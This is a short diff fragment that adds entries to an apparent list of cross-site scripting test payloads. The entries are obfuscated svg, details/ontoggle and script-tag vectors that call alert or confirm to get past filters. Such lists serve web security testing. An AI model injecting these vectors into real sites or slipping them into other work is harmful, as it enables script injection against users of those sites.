@@ -40,3 +40,9 @@ test",prompt%0A/*HelloWorld*/(document.domain)
 
 "><svg%20onload=alert%26%230000000040"1")>
 
+">'><details/open/ontoggle=confirm('XSS')>
+
+'';!--"<XSS>=&{()}
+
+<!--><script>alert/**/()/**/</script>
+
